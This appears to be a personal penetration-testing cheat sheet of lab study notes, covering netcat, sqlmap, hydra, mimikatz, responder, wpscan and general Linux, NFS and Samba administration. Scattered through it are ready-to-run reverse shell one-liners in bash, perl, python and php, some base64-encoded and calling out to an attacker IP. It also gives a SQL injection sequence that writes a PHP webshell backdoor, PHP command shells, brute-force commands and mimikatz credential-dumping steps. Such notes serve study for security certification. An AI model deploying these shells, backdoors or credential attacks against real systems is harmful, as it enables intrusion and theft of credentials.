nc -nv 10.0.0.1 4444 -e /bin/bash            ** connect to the server and provide linux reverse shell


susie:~# nc -v -z -n -w 1 10.11.1.226 1-1023 ** very fast port scanner


85)ncat
ncat is a new replacement for netcat where new features are available. while testing i saw the following new features:
- the intro of ssl  option is --ssl
- the ability to restrict source ip of clients.
options is --allow 10.0.0.1


Here is an enxample of ncat
C:\Users\offsec>ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
root@kali:~# ncat -v 10.0.0.22 4444 --ssl


86) Python Simple http server
 python -m SimpleHTTPServer 8080
 python3 -python3 -m http.server




87) sqlmap
sqlmap -r [text file containing the post request ] -p [parameter-name]


example
sqlmap -r search-test.txt -p tfUPass http://1.1.1.1/bla
root@kali:~# sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs        // dump databases
root@kali:~# sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --tables -D gallery // dump tables.
root@kali:~# sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump // dump all database table entries
--os-shell : ask sqlmap to obtain a shell for you.




--level 4 --risk 3 << will do most of the tests
--batch  : do not ask me any question






88) upgrade a dump shell into a tty
python -c 'import pty; pty.spawn("/bin/bash")'








89) first places to try to put your files in because of permissions
/tmp/" and "/var/tmp/"


90) nslookup
nslookup
> server 10.11.1.220
Default server: 10.11.1.220
Address: 10.11.1.220#53
> set q=ptr
> 10.11.1.115
Server:                10.11.1.220


Address:        10.11.1.220#53


115.1.11.10.in-addr.arpa        name = tophat.acme.local.


nslookup -type=[record type] domain   // -type=any returns everything
nslookup -t axfr [domain name]   [dns server ns server ]  // zone trasnfer
91) dig
Dig +norecurse @servername name type
$ dig @[DNS server IP] [target domain]  AXFR
dig @4.2.2.2 www.cisco.com a


OR dig -t mx google.com
dig -t any google.com   // request all records.


reverse look for an ip
dig -x 8.8.8.8






92) curl utility
curl http://myservice --upload-file file.txt ** upload files via http put method


curl --proxy http://10.1.1.1:8080   ** connect with a proxy server
curl -H "Content-Type:text/html"    ** specify the header in the request
-k : disable cert validation


show server header response
curl -i http://www.google.com




download file via ftp and curl


curl -u user:password 'ftp://mysite/%2fusers/myfolder/myfile/raw' -o ~/Downloads/myfile.raw










supported url protocols


root@kali:~/htb/Haircut# curl-config --protocols
DICT
FILE
FTP
FTPS
GOPHER
HTTP
HTTPS
IMAP
IMAPS
LDAP
LDAPS
POP3
POP3S
RTMP
RTSP
SCP
SFTP
SMB
SMBS
SMTP
SMTPS
TELNET
TFTP


=========================
umask


 umask is 022; you subtract this number from 777, for directories, or 666 for files to determine the eventual permissions.
In this case it would be 755 for directories and 644 for files.




=========================




93) check if you are running 32 or 64 bit system
To know whether your system is 32-bit or 64-bit, type the command "uname -m" and press "Enter". This displays only the machine hardware name. It shows if your system is running 32-bit (i686 or i386) or 64-bit(x86_64).Mar 9, 2017


94) gcc compiler


-fno-stack-protector compile with stack protection disabled
-m32            ** compile for 32 bit arch
-m64            ** compile for 64 bit arch
-Wl,--hash-style=both          ** compile for old kernel versions




gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles


fpic: position independent code << maybe to used to libraries.


create a shared library from an object file:
gcc -shared -o libfoo.so foo.o




-z execstack:
makes the stack executable




// compile 32bit executables with gcc on ubuntu
apt-get install lib32gcc-4.8-dev
sudo apt-get install gcc-multilib




95) find a program shared libraries
ldd <executable name>
root@kali:/var/www/html# ldd pe.exe
        linux-gate.so.1 (0xb777d000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb759c000)
        /lib/ld-linux.so.2 (0xb777f000)


find the missing libraries if needed
ldd -d path/to/program




96) gobuster tool
gobuster -u http://10.11.1.71/ \
  -w /usr/share/seclists/Discovery/Web_Content/common.txt \
  -s '200,204,301,302,307,403,500' -e php


my prefered list of words
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.251/


wirh a peoxy
gobuster -w /usr/share/wordlists/dirb/common.txt    -p http://192.168.30.53:3128 -u http://192.168.30.53


directories
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


with basic authentication and a proxy
gobuster  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.21  -t 30  -U kalamari -P ihateseafood -p http://10.10.10.21:3128




-f : force adding / at the end of the URI
-a : specify the user agent header




new style :
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --url http://10.10.10.151/user




97) Cadavr tool
connect to an http server and upload some files


cadaver http://10.11.1.229


98) dirbuster tool
web directory scanning tool




irbuster
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /_private/ - 200
Dir found: /_vti_log/ - 200
Dir found: /aspnet_client/ - 403
Dir found: /images/ - 200
File found: /nikto-test-QkL4Z09Z.html - 200


Note: words file is selected form the gui.


word files are located at
/usr/share/dirbuster/wordlists/






99) good user word lists
/usr/share/seclists
/usr/share/wordlists




100) compile an app for windows from linux


apt-get install mingw-w64






i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
see available compiler
root@kali:~/mail# apt-cache search mingw-w64
i686-w64-mingw32-gcc [input file: source] -o [output file: .exe] -lws2_32


-lws2_32


The -l option is for naming the libraries/dlls you want to link with which in this case references the 32-bit winsock dll (ws2_32).




101) add a static route via ip route
ip route add 10.1.0.0/16  via 10.11.0.1 dev tap0


102) mysql
mysql -u [username] -p[password]          << no spaces between p and password itself
execute a system command from the dbms
\! ls -l
system cd './my_dir'


show databases;
use [DATABASE];
show tables;
select * from [TABLE];


** The account has a valid shell instead of /bin/false.
which allows loggin into the system with mysql username




you can get access to the Mysql root password by running strings on the following file: /var/lib/mysql/mysql/user.MYD.


You should get 2 passwords:


debian-sys-maint
root


The root password is likely splitted into two parts:


localhost
root*8246FACFAA5BB9CFDCDEAEDA
6c732c6044b7
root
    127.0.0.1
root
root
    localhost
debian-sys-maint*7B6D59ECDB7B791CF100CA46D0AD911082112351
15DA4067EAA55FBC


The first part is *8246FACFAA5BB9CFDCDEAEDA and the second part is 15DA4067EAA55FBC (the value should be different on the live instance).


Once you put them together, you should get a file containing:


root:*8246FACFAA5BB9CFDCDEAEDA15DA4067EAA55FBC


** crack mysql pass with john
root:*9F5E654FF7681FCF7D63D339846039B6644CBA79




*** read the content of a file using mysql
mysql> select 1,2,load_file("/var/lib/mysql-files/key.txt");
+---+---+-------------------------------------------+
| 1 | 2 | load_file("/var/lib/mysql-files/key.txt") |
+---+---+-------------------------------------------+
| 1 | 2 | 4234db90-01c6-4f10-8c81-8c0017107fc7
     |
+---+---+-------------------------------------------+
1 row in set (0.00 sec)




**** crack ssh keys with john


ssh2john rsakey > rsa2johnfile
#root@kali: john –wordlist=/usr/share/wordlists/rockyou.txt –format=SSH rsa2johnfile










103) wget utility
download files via wget
wget http://10.0.0.1/xyz -O file.zip


ignore cert check
--no-check-certificate


download all files in a directory recursivly


wget -r http://x.y.x.c








104) directory permissions
• The write bit allows the affected user to create, rename, or delete files within the directory, and modify the directory's attributes
• The read bit allows the affected user to list the files within the directory
• The execute bit allows the affected user to enter the directory, and access files and directories inside
• The sticky bit states that files and directories within that directory may only be deleted or renamed by their owner (or root)


105) from vi use sed o replace a pattern in all lines
:%s/pattern/replace/


106) multiine cat
cat << EOF
enter multi line text here
EOF


107) append multi lines to a text file with echo


echo "
> #include <unistd.h>
int main() {
        char *args[2];
        args[0] = "/bin/sh";
        args[1] = NULL;
        execve(args[0], args, NULL);
}#include <unistd.h>
> int main() {
>         char *args[2];
>         args[0] = "/bin/sh";
>         args[1] = NULL;
>         execve(args[0], args, NULL);
> " >> /tmp/mc




108) run a command at regular intervals with watch utility
watch -n 3 free -m           // run the free command every 3 seconds


109) execute a command only if the first one works
&& executes the command which follow only if the command which precedes it succeeds.  || does the opposite:


110) kali web shells
ls /usr/share/webshells/


111) strace -f
trace the system calls for an executable




112) medusa tool brute force
medusa -h 10.11.1.73 -n 8080 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/PHP -T 30


web form brute force
$ medusa \
  -h 127.0.0.1 \
  -u admin \
  -P /data/dict/dict.txt \
  -M web-form \
  -m FORM:"admin/test.php" \
  -m DENY-SIGNAL:"ACCESS DENIED" \
  -m FORM-DATA:"post?u=&p=&Login=Login"

113) Hydra tool


hydra [ip] [form: <url>:<form parameters>:<failure string>:Cookie]




brute force
hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.73 http-post-form "/php/index.php:nickname=^USER^&password=^PASS^&tg=login&referer=index.php&login=login&sAuthType=Ovidentia&submit=Login:User not found or bad password" -V
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.




http brutefoce
hydra -l elliot -P dic 192.168.210.2 http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"


post login brute force
hydra 10.10.10.43 -l admin -P "/usr/share/seclists/Passwords/10k_most_common.txt" 10.10.10.10 http-post-form "/department/login.php:username=admin&password=^PASS^:invalid"


notice the colon above


Hydra with get parameters brutefrorce


hydra -L usernames.txt -P passwords.txt site.appspot.com http-get-form "/lab/webapp/1:email=^USER^&password=^PASS^:Failed"


hydra http basic auth
hydra -l admin -P  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt8090 -f 192.168.1.4 http-get /get_camera_params.cgi






hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form
“/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed”




hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-form-get http-get-form
"/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:
security=low;PHPSESSID=409e45633a8281adb8f182021cfacd14"








ssh
hydra -l root -P password-file 10.10.10.10 ssh






debugging with hydra
 -v for verbose mode.
• -V for displaying each attempt on the terminal.
• -D for debugging.


===========================


Linux signals
kill command : a kill message is sent to the process by the kernel
kill pid


default signal is TERM                 - Terminate
you can send a different by one by appending the signal to the command :
kill -STOP pid




A stopped process is still in memory, ready to pick up where it left off. Use the CONT signal to continue running the process again:


$ kill -CONT pid




using ctrl c is equivilant of using the kill command to end a process with the INT (interrupt  ) signal.


The most brutal way to terminate a process is with the KILL signal. Other signals give the process a chance to clean up after itself, but KILL does not. The operating system terminates the process and forcibly removes it from memory. Use this as a last resort.


CTRL Z :
sends TSTP signal
use fg to start the process again


=============================






directory permissions
readable : allows you to list the content of a directory
writable : create files there
executable : allows you to access a file in the directory













==============================
gpg
decrypt with gpg


gpg --output bundle --decrypt ise-support-bundle-gotnet045-mjageval-11-12-2018-14-19.tar.gpg
OR
gpg -d [encrypted file name]




encrypt with gpg
gpg -c <file to be encrypted>


===========================
extended file attributes




$ setfattr -n user.comment -v "this is a comment" testfile
$ getfattr testfile
# file: testfile
user.comment
$ getfattr -n user.comment testfile
# file: testfile
user.comment="this is a comment"








==============================
nmap brute force http get
nmap  -p 80 pentesteracademylab.appspot.com --script http-brute.nse  --script-args 'http-brute.hostname=pentesteracademylab.appspot.com, http-brute.method=GET,http-brute.path=/lab/webapp/auth/1/loginscript,userdb=users2.txt,passdb=passwords.basic'














==============================


113) hashid tool
identify the hash in the file on linux


114) hashcat
password cracking tool that relies on gpu
hashcat -m 10 -a 0 pass /usr/share/wordlists/rockyou.txt






115) install pyinstaller
pip install pyinstaller


116) wfuzz tool
web enumeration
wfuzz -w file1.txt -w file2.txt --hc 404 http://10.11.1.133/dir/FUZZFUZ2Z
python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ




-c to output with colors.
-z file,wordlist/general/big.txt tells wfuzz to use the file wordlists/general/big.txt as a dictionary to brute force the remote directories' name.
--hc 404 tells wfuzz to ignore the response if the response code is 404 (Page not Found)
http://vulnerable/FUZZ tells wfuzz to replace the word FUZZ in the URL by each value found in the dictionary.


detech php scripts
$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php






you can also filter based on response size
--hw : hied words
--hh : hide chars








117) useful reverse shell
/bin/nc.traditional -c /bin/bash 192.168.6.122 33666


118) pyinstaller
python pyinstaller.py --onefile ms11-080.py


119) winexe tool
a linux tool that utilizes smb to execute commands on a windows machine which is very cool


root@kali:~# winexe -U 'Administrator%s3cr3t' //192.168.1.225 'cmd.exe /c echo "this is running on windows"'
"this is running on windows


using wine.exe with a domain account
root@kali:~/JD# winexe -U thinc/robert  //10.11.1.218 'cmd.exe /c whoami'






120) responder utility
sniff/intercept/steam passor dhashes from windows machines on the network.




you edit /etc/responder/Responder.conf putting your target there:


; Specific IP Addresses to respond to (default = All)
; Example: RespondTo = 10.20.1.100-150, 10.20.3.10
RespondTo = 10.11.1.220
; Specific NBT-NS/LLMNR names to respond to (default = All)
; Example: RespondTo = WPAD, DEV, PROD, SQLINT
RespondToName =




Then you run the command
responder -I tap0 and keep watching for any dummped things out there.




121) mimikatz tool
the beauty and the beast IMAX


#run the tool and get into the mimikaz prompt
mimikatz.exes
# enable debug mode
privilege::debug
#inject sekurlsa.dd into LSASS using inject process command
inject::process lsass.exe sekurlsa.dll


#pull any available login passwords
mimikatz # sekurlsa::logonpasswords full


122) egrep the power of regex
root@kali:~/sufference# nmap -F -A 10.11.1.136 | egrep '(\/tcp|Service Info)'
22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)
113/tcp open  ident
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)
445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


find the acl line with more numbers
cat adwea-show-acl  | grep -oe  'line\s[0-9]\+' | uniq -c | sort -nr > result








123) using webplayer command
C:\Program Files (x86)\cisco\hwl2ascii>hwl2ascii.exe -s -x -o "C:\Users\rtpvpn\Desktop\webplayer\<cco id>\<sr number>" "C:\Users\rtpvpn\Desktop\webplayer\<cco id>\<working httpwatch file>.hwl"




124) one line reverse shells
bash -i >& /dev/tcp/192.168.33.129/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f [good]


php -r '$sock=fsockopen("127.0.0.1",81);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[Attack box IP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'






If the reverse shell session closes quickly after it has been established try to create a new shell session by executing the following command on the initial shell:
bash /bin/bash


perl
perl -e 'use Socket;$i="[Attack box
IP]";$p=[Port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p
,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'




python
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[Attack
box IP]",[Port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);














php -r '$sock=fsockopen("127.0.0.1",81);exec("/bin/sh -i <&3 >&3 2>&3");'


This reverse shell command contains special characters that will prevent it from executing on the
target host without proper encoding.  So please encode it [watch out for the ampersand char]




=============================


125) SQL injection cheat sheet



sql injection commands












testing for sql injection
from pwk course : wrong' OR 1=1;#
from some machine on vuln hub: 'or 'a'='a' #
wrong' OR 1=1 LIMIT 1;#




maniplulating the id paramter
1) test for injection
http://10.11.1.35/comment.php?id=738'


2) enumerate the number of columns
http://10.11.1.35/comment.php?id=738 order by 1
http://10.11.1.35/comment.php?id=738 order by 2
http://10.11.1.35/comment.php?id=738 order by 3
http://10.11.1.35/comment.php?id=738 order by 4
http://10.11.1.35/comment.php?id=738 order by 5
// until you find an error that is the number of columns


3) understanding the layout of the output
where are the outputs echod back


http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,5,6
look in the response for those numbers. that is where your outputs will be echoed back.




4) extracting data from the database
mysql version
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,@@version,6


current user
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,user(),6


table names
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables


column names in a specific table
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'


extract username and password
http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users


5) put code on the server
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'








http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'






@@hostname : Current Hostname
@@tmpdir : Tept Directory
@@datadir : Data Directory
@@version : Version of DB
@@basedir : Base Directory
user() : Current User
database() : Current Database
version() : Version
schema() : current Database
UUID() : System UUID key
current_user() : Current User


125) static dns entry. add an entry to /etc/hosts
ip address    <> hostname




126) dirb web directory brute force


dirb [URL target host] [wordlist]
root@kali:~# dirb http://10.10.10.100 /usr/share/wordlists/dirb/big.txt
-p 10.10.10.10:3128               << here it is with a proxy


dirb http://192.168.30.67 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


shortcuts when the tool is running :
n: stop scanning the current directory and switch to the next one.
q: stop the current scan and save the state.
r: remaining scan stats.


dirb http://192.168.1.215/mutillidae  /usr/share/dirb/wordlists/common.txt






127) spawn a tty using bash
python -c 'import pty;pty.spawn("/bin/bash")'


upgrade to a rich tty


More Fun [Hooot]
1)Background it with Ctrl Z


2) stty raw -echo


3) bring it back and now you have a more rich tty








128) python reverse shell with msfvenom
msfvenom -p cmd/unix/reverse_python LHOST=192.168.2.3 LPORT=7777 -f raw
manual
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'




129) python reverse shell encoded base64
==============


root@kali:~# msfvenom -p cmd/unix/reverse_python LHOST=192.168.2.3 LPORT=7777 -f raw
No platform was selected, choosing Msf::Module::Platform::Unix from the payload
No Arch selected, selecting Arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 477 bytes
python -c "exec('aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgICA7aG9zdD0iMTkyLjE2OC4yLjMiICAgICA7cG9ydD03Nzc3ICAgICA7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAsICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgICwgICAgcG9ydCkpICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICAsICAgIDApICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICAsICAgIDEpICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICAsICAgIDIpICAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))"




** normal python reverse shell with udp
import os
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u <LAB IP> <PORT> >/tmp/f &").read()
==============




on the machine on which you want to obtain the shell
echo "exec('aW1w...KQ=='.decode('base64'))" > /var/www/connect.py




130) execute command as another user:
sudo -u alpha chmod u+x file.txt


sudo -l   // see what can commands you can do with sudo
 sudo -u victim /bin/bash




=============
131) python reverse shell


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


OR as in a file
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.176",1234));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


OR to echo it to a file
echo "import socket,subprocess,os" > test1.py
echo "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)" >> test1.py
echo "s.connect((\"10.10.14.176\",1234));os.dup2(s.fileno(),0)" >> test1.py
echo "os.dup2(s.fileno(),1)" >> test1.py
echo "os.dup2(s.fileno(),2)" >> test1.py
echo "p=subprocess.call([\"/bin/sh\",\"-i\"])" >> test1.py


================
nfs
allows a client to mount a file on a remote computer [exports]
exports are the things we want to share.
v4 uses tcp port 2049
v3 uses dynamically allocated ports. v3 is rpc over udp.


NFS Services
Server:
nfs-server TCP Based Server version 4
rpcbind - Manages RPC port reservations and connections (only needed for v3)




Client:
rpcbind only needed for version 3
no need for any services on the client if ersion 4 is being used


NFS server configuration
===========================


on server and client
yum install nfs-utils


on server
systemctl start nfs-server


1- first configure the exports
exports are configured under /etc/exports
/share1         host(options)




2- update the exports via eportfs command which maintains a table of exported file systems.
that table is kept in /var/lib/nfs/etab
sudo exportfs -arv


example for exports in /etc/exports
/share1             server1.example.com


// the above entry is using the default options. but what are the default options:
ro - readonly
sync - reply only when writes are comitted to disk.
wdelay - delayed disk writes
root_squash  - changes root to anonymous. << when client request comes with uid of root. nfs dameon will map then to anonymous.




Other common options:
rw/ro -allow read/write access
sync/async  - write acknowledgments
all_squash - all user ids mapped to an anonymous user
sec=krb5, krb5i or krb5p            authentication settings




krb5: just user authentication
krb5i: adds integrity
krb5p : adds encrytpion




NFS Client configuration
=========================
mount the filesystem
manually:
mount -t nfs -o rw server1.example.com:/share1 /mnt/share1


persistent mounting
/etc/fstab
server1.example.com:/share1 /mnt/share1 nfs rw 0 0


dynamic on demand mounting
    tofs








Note:
mount options can be defined gloabby inside /etc/nfsmount.conf instead of being defined separatly for each mount.


// client default options
rw
async
suid- use setuid programs
dev - mount on file system as block or char device
exec - allow execution of programs
auto - mountable with mount -a
hard - blockin waits if server is offline
sec=sys - use the UID/GID security model
relatime - update inode access times.




hostname formats:
==================
IP or NAME
        server1.example.com or 1.1.1.1


IP networks
        CIDR notation
            192.168.1.0/24


Range of machines  via regexes
        *.example.com
        server?.cisco.com   // matching any single character




needed packages
================
nfs-utils




enabling the service on the server
systemctl enable nfs-server






discover what directoires are available on the server
====================
on the server
systemctl enable rpcbind




on the client just do this command to see all available shares
showmount -e server1.example.com









dynamic on demand mounting
        autofs


only mount when the directory is accessed
yum install autofs
sudo systemctl enable autofs
sudo vi /etc/auto.misc


add this line:
share1    -fstype=nfs,rw        server1.example.com:/share1






restart the autofs service
cd into /misc and you will not find anything
cd into /misc/share1 and you will it mounted at that moment


note: the mounted directory came under /misc which is part of the config of autofs








NFS Security
^^^^^^^^^^^^
the default security model for nfs is that uid and gid for the user on the client machine are sent to the server and compared to the
file system access permission for that server. So the user should exist on both to be able to act as a user on the server.


Plus what if a user has the same uid on another client machine. then for the server he will appear as alice too. !! BOOM!!
IMagine the root as he will have a UID of 0 on both. BOOM so we have the squash option.


Solution:
Use a centralized authentication system like kerberos






Authentication Models:
AUTH_SYS
    UID/GID


AUTH_GSS






client config for kerberos




================
Samba




****) share a folder from linux to windows clients via samba
Configuration file:
/etc/samba/smb.conf


Each share needs to be defined in that file in its own section.
To provide access for the share to windows client smbpasswd should be used as they have windows accounts and they are trying to access a share on a linux system.


Create a new password for a samba user:
#smbpasswd -a geoff
# smbpasswd geoff                         // change the password


In the even the unix username does not match the samba username /etc/samba/smbusers allows for this translation with this syntax:
#UNIXNAME = SMBNAME SMBNAME2


# testparm                                 //        test /etc/samba/smb.conf syntax


#mount -t cifs -o username,password //server/share /mnt/point
Solutions:
#mkdir /srv/smbshare
#yum install samba
#edit /etc/samba/smb.conf and add the share :




 [smbshare]
        comment = Public Stuff
        path = /opt/smbshare
        writable = yes
        browsable = yes
        public = yes
        valid users = smbtest                                // for group use  = +engineers
        create mask = 640
        directory mask = 750








#systemctl start smb
#iptables -A INPUT -p tcp --dport 443 -j ACCEPT


Note: be sure that file permissions for the directory shared allow the needed goal.








132) connect to a share file on a windows machine via samba and smb
a) install needed packages
apt-get install cif-utils
apt-get update


b)
create a new folder on the linux machine with the name NetworkFIles
c)mount the folder:
mount.cifs //win10/SharedFiles /root/Desktop/NetworkFiles -o user=username
you need to enter the password of the user


=================########3
installing and configuring kerberos server
check prular lfcs videos
[malhyari to be done ]






####################
133) make directories with recursive creation of them
mkdir -p /1/2/3/4/5/6




=================
134) tcpdump
read from file
tcpdump -r capin.pcap


display hex dump
tcpdump -X -r capin.pcap


disable dns reverse resolution
tcpdump -n -r capin.pcap


capture on a specific interface
tcpdump -i eth0 host 1.1.1.1


display ascii
tcpdump -A
capture packet with specific flags
CEUAPRSF


ex ACK and PUSH : 00011000 = 24 in decimal
tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap






==================
135
Php cmd execution code
php one line script
php cmd script


<?php echo shell_exec($_GET['cmd']);?>


for one line outputs you can use php system command.




=================
136
php execute system command  starting a reverse shell
<?php echo shell_exec("nc.exe -nlvp 5555 -e cmd.exe");?>




===================


====================
138
copy files via tftp
tftp -l <local file> -r <remote file> -p <remote ip>


tftp -g -r <remote file> <remote ip>






===================


139
wc


count chars lines bytes


count the number of bytes in a shell code
cat shell  | grep -o x | wc -l


count words
root@kali:~/BO1# wc mem-shell -w




=====================
diff command


The important thing to remember is that diff uses certain special symbols and instructions that are required to make two files identical.
It tells you the instructions on how to change the first file to make it match the second file.


the symbols are :
a   : add
d   : delete
c   : change








$ cat a.txt
Gujarat
Uttar Pradesh
Kolkata
Bihar
Jammu and K ashmir


$ cat b.txt
Tamil Nadu
Gujarat
Andhra Pradesh
Bihar
Uttar pradesh






$ diff a.txt b.txt
0a1
> Tamil Nadu
2,3c3
< Uttar Pradesh
 Andhra Pradesh
5c5
 Uttar pradesh








Let’s take a look at what this output means. The first line of the diff output will contain:


Line numbers corresponding to the first file,
A special symbol and
Line numbers corresponding to the second file.






Like in our case, 0a1 which means after lines 0(at the very beginning of file) you have to add Tamil Nadu to match the second file line number 1.
It then tells us what those lines are in each file preceeded by the symbol:


Lines preceded by a < are lines from the first file.
Lines preceded by > are lines from the second file.
Next line contains 2,3c3 which means from line 2 to line 3 in the first file needs to be changed to match line number 3 in the second file. It then tells us those lines with the above symbols.
The three dashes (“—“) merely separate the lines of file 1 and file 2.




[malhyari fix this ]




================
140
convert text from lower case to upper case


cat mem-shell |  tr [a-z] [A-Z]




====================
the man command
when you need help . remeber everything is there but you need to know how to search. otherwise you are wasted


man -k [keyword]                 //search man page by keyword




man page sections [the ones appearing between ()]
1 user commands
2 system calls
3 high level unix programing library documentation
4 device interface and driver information
5 file description (system configuration files)
6 games
7 file format, conventions, and encoding
8 system commands and servers




select manual page by number [man select the first page it finds by default ]
man 5 passwd


if you do not like man try
--help
-h
or
info [command]


================


141
all chars array
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\
x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")










===================
142
wpscan
word press scanner
wpscan --url http://10.10.10.10 --log


enumerate users:
wpscan --url http://10.10.10.10 --log --enumerate u


Enumerate vulnerable plugins
wpscan --url 10.0.2.4 --enumerate vp


bruteforce a password
wpscan -u 10.0.2.4 --wordlist ~/fsocity.dic --username elliot




wpscan --update                     // update wpscan


The default scan option enumerates plugins using passive detection which means that it scans the main page only and searches for traces of plugins in the HTML content, JavaScript and CSS files.


plugins scan options


p: Scans popular plugins only
vp: Scans vulnerable plugins only.
ap: Scans all plugins


for themes
t: Scans popular themes only.
